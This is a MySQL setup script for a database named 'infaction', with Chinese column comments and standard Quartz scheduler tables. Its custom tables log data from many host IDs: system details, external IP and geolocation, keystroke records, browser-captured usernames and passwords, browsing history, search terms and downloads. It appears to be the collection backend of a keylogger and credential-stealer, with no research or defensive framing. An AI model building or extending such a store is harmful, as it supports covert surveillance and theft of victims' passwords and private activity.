DROP database infaction;
CREATE DATABASE `infaction` character set utf8  /*!40100 DEFAULT CHARACTER SET utf8 */;
USE `infaction`;
DROP TABLE  IF  EXISTS  `machine`;
CREATE TABLE IF NOT EXISTS `machine` (
  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
  `user` varchar(30) NOT NULL COMMENT '系统用户',
  `version` varchar(80) NOT NULL COMMENT '系统版本',
  `version_info` varchar(20) NOT NULL COMMENT '系统信息',
  `uptime` int(5) NOT NULL DEFAULT  0 COMMENT '运行时间',
  `cpu` int(5) NOT NULL DEFAULT  0 COMMENT 'cpu逻辑核数',
  `gpu` varchar(100) NOT NULL DEFAULT  0 COMMENT 'GPU品牌',
  `memory` int(5) NOT NULL DEFAULT  0 COMMENT '内存MB',
  `disk` varchar (800) NOT NULL COMMENT '硬盘信息',
  `netcard` text NOT NULL COMMENT '网卡信息',
  `oip` varchar (20)  NULL COMMENT '外网IP',
  `isp` varchar (80)  NULL COMMENT '运营商',
  `lon` double(10,6)  NULL COMMENT '经度',
  `lat` double(10,6)  NULL COMMENT '纬度',
  `down` int (5)  NULL COMMENT '下行',
  `up` int (5)  NULL COMMENT '上行',
  `hostid` varchar (50) NOT NULL COMMENT '主机ID',
  `softversion` varchar(5) NOT NULL COMMENT '软件版本',
  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
  PRIMARY KEY (`id`),
  unique  index(`hostid`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
--联合主键需要一起作为外键
DROP TABLE  IF  EXISTS  `keyboard`;
CREATE TABLE IF NOT EXISTS `keyboard` (
  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
  `hit` text NOT NULL COMMENT '敲击记录',
  `hostid` varchar (50) not null COMMENT '主机ID' ,
  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
  PRIMARY KEY (`id`),
  constraint user_keyboard_id foreign key(hostid) references machine(hostid)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

DROP TABLE  IF  EXISTS  `browser`;
CREATE TABLE IF NOT EXISTS `browser` (
  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
  `origin_url` varchar(3000) NOT NULL COMMENT '浏览网址',
  `action_url` varchar(3000)  NOT NULL COMMENT '浏览网址',
  `user`  varchar(30)  not null COMMENT '账号' ,
  `password` varchar(50)  not null COMMENT '密码' ,
  `hostid` varchar(50) not null COMMENT '主机ID' ,
  `type` varchar(30) not null COMMENT  '浏览器类型',
  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
  PRIMARY KEY (`id`),
  constraint user_browser_id foreign key(hostid) references machine(hostid)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

DROP TABLE  IF  EXISTS  `browser_url`;
CREATE TABLE IF NOT EXISTS `browser_url` (
  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
  `website` text NOT NULL COMMENT '浏览网址',
  `title`  varchar(1000)  not null COMMENT '标题' ,
  `visit` int(10)  not null COMMENT '查看次数' ,
  `hostid` varchar(50) not null COMMENT '主机ID' ,
  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
  PRIMARY KEY (`id`),
  constraint browser_url_id foreign key(hostid) references machine(hostid)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

DROP TABLE  IF  EXISTS  `browser_keyword`;
CREATE TABLE IF NOT EXISTS `browser_keyword` (
  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
  `keyword` varchar(500) NOT NULL COMMENT '查询关键字',
  `hostid` varchar(50) not null COMMENT '主机ID' ,
  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
  PRIMARY KEY (`id`),
  constraint browser_keyword_id foreign key(hostid) references machine(hostid)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

DROP TABLE  IF  EXISTS  `browser_download`;
CREATE TABLE IF NOT EXISTS `browser_download` (
  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
  `url` varchar(500) NOT NULL COMMENT '下载地址',
  `hostid` varchar(50) not null COMMENT '主机ID' ,
  `path` varchar(255) not null COMMENT '下载到本地的路径' ,
  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
  PRIMARY KEY (`id`),
  constraint browser_download_id foreign key(hostid) references machine(hostid)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

DROP TABLE  IF  EXISTS  `event`;
CREATE TABLE IF NOT EXISTS `event` (
  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
  `hostid` varchar(50) not null COMMENT '主机ID' ,
  `code` int(10) not null COMMENT '状态码' ,
  `softversion` varchar(5) not null COMMENT '版本' ,
  `type` varchar(25) not null COMMENT '程序类型' ,
  `reason` varchar(100) not null COMMENT '失败原因' ,
  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
  PRIMARY KEY (`id`),
  constraint event_id foreign key(hostid) references machine(hostid)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `qrtz_job_details`;
CREATE TABLE `qrtz_job_details` (
  `sched_name` varchar(120) NOT NULL,
  `job_name` varchar(80) NOT NULL,
  `job_group` varchar(80) NOT NULL,
  `description` varchar(120) DEFAULT NULL,
  `job_class_name` varchar(128) NOT NULL,
  `is_durable` int(11) NOT NULL,
  `is_nonconcurrent` int(11) NOT NULL,
  `is_update_data` int(11) NOT NULL,
  `requests_recovery` int(11) NOT NULL,
  `job_data` blob,
  PRIMARY KEY (`sched_name`,`job_name`,`job_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `qrtz_triggers`;
CREATE TABLE `qrtz_triggers` (
  `sched_name` varchar(120) NOT NULL,
  `trigger_name` varchar(80) NOT NULL,
  `trigger_group` varchar(80) NOT NULL,
  `job_name` varchar(80) NOT NULL,
  `job_group` varchar(80) NOT NULL,
  `description` varchar(120) DEFAULT NULL,
  `next_fire_time` bigint(20) DEFAULT NULL,
  `prev_fire_time` bigint(20) DEFAULT NULL,
  `priority` int(11) DEFAULT NULL,
  `trigger_state` varchar(16) NOT NULL,
  `trigger_type` varchar(8) NOT NULL,
  `start_time` bigint(20) NOT NULL,
  `end_time` bigint(20) DEFAULT NULL,
  `calendar_name` varchar(80) DEFAULT NULL,
  `misfire_instr` smallint(6) DEFAULT NULL,
  `job_data` blob,
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  KEY `sched_name` (`sched_name`,`job_name`,`job_group`),
  CONSTRAINT `qrtz_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `job_name`, `job_group`) REFERENCES `qrtz_job_details` (`sched_name`, `job_name`, `job_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `qrtz_blob_triggers`;
CREATE TABLE `qrtz_blob_triggers` (
  `sched_name` varchar(120) NOT NULL,
  `trigger_name` varchar(80) NOT NULL,
  `trigger_group` varchar(80) NOT NULL,
  `blob_data` blob,
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  CONSTRAINT `qrtz_blob_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `qrtz_triggers` (`sched_name`, `trigger_name`, `trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `qrtz_calendars`;
CREATE TABLE `qrtz_calendars` (
  `sched_name` varchar(120) NOT NULL,
  `calendar_name` varchar(80) NOT NULL,
  `calendar` blob NOT NULL,
  PRIMARY KEY (`calendar_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `qrtz_cron_triggers`;
CREATE TABLE `qrtz_cron_triggers` (
  `sched_name` varchar(120) NOT NULL,
  `trigger_name` varchar(80) NOT NULL,
  `trigger_group` varchar(80) NOT NULL,
  `cron_expression` varchar(120) NOT NULL,
  `time_zone_id` varchar(80) DEFAULT NULL,
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  CONSTRAINT `qrtz_cron_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `qrtz_triggers` (`sched_name`, `trigger_name`, `trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `qrtz_fired_triggers`;
CREATE TABLE `qrtz_fired_triggers` (
  `sched_name` varchar(120) NOT NULL,
  `entry_id` varchar(95) NOT NULL,
  `trigger_name` varchar(80) NOT NULL,
  `trigger_group` varchar(80) NOT NULL,
  `instance_name` varchar(80) NOT NULL,
  `fired_time` bigint(20) NOT NULL,
  `sched_time` bigint(20) NOT NULL,
  `priority` int(11) NOT NULL,
  `state` varchar(16) NOT NULL,
  `job_name` varchar(80) DEFAULT NULL,
  `job_group` varchar(80) DEFAULT NULL,
  `is_nonconcurrent` int(11) DEFAULT NULL,
  `requests_recovery` int(11) DEFAULT NULL,
  PRIMARY KEY (`sched_name`,`entry_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `qrtz_locks`;
CREATE TABLE `qrtz_locks` (
  `sched_name` varchar(120) NOT NULL,
  `lock_name` varchar(40) NOT NULL,
  PRIMARY KEY (`sched_name`,`lock_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `qrtz_paused_trigger_grps`;
CREATE TABLE `qrtz_paused_trigger_grps` (
  `sched_name` varchar(120) NOT NULL,
  `trigger_group` varchar(80) NOT NULL,
  PRIMARY KEY (`sched_name`,`trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `qrtz_scheduler_state`;
CREATE TABLE `qrtz_scheduler_state` (
  `sched_name` varchar(120) NOT NULL,
  `instance_name` varchar(80) NOT NULL,
  `last_checkin_time` bigint(20) NOT NULL,
  `checkin_interval` bigint(20) NOT NULL,
  PRIMARY KEY (`sched_name`,`instance_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `qrtz_simple_triggers`;
CREATE TABLE `qrtz_simple_triggers` (
  `sched_name` varchar(120) NOT NULL,
  `trigger_name` varchar(80) NOT NULL,
  `trigger_group` varchar(80) NOT NULL,
  `repeat_count` bigint(20) NOT NULL,
  `repeat_interval` bigint(20) NOT NULL,
  `times_triggered` bigint(20) NOT NULL,
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  CONSTRAINT `qrtz_simple_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `qrtz_triggers` (`sched_name`, `trigger_name`, `trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `qrtz_simprop_triggers`;
CREATE TABLE `qrtz_simprop_triggers` (
  `sched_name` varchar(120) NOT NULL,
  `TRIGGER_NAME` varchar(200) NOT NULL,
  `TRIGGER_GROUP` varchar(200) NOT NULL,
  `STR_PROP_1` varchar(512) DEFAULT NULL,
  `STR_PROP_2` varchar(512) DEFAULT NULL,
  `STR_PROP_3` varchar(512) DEFAULT NULL,
  `INT_PROP_1` int(11) DEFAULT NULL,
  `INT_PROP_2` int(11) DEFAULT NULL,
  `LONG_PROP_1` bigint(20) DEFAULT NULL,
  `LONG_PROP_2` bigint(20) DEFAULT NULL,
  `DEC_PROP_1` decimal(13,4) DEFAULT NULL,
  `DEC_PROP_2` decimal(13,4) DEFAULT NULL,
  `BOOL_PROP_1` varchar(1) DEFAULT NULL,
  `BOOL_PROP_2` varchar(1) DEFAULT NULL,
  PRIMARY KEY (`sched_name`,`TRIGGER_NAME`,`TRIGGER_GROUP`),
  CONSTRAINT `qrtz_simprop_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `TRIGGER_NAME`, `TRIGGER_GROUP`) REFERENCES `qrtz_triggers` (`sched_name`, `trigger_name`, `trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

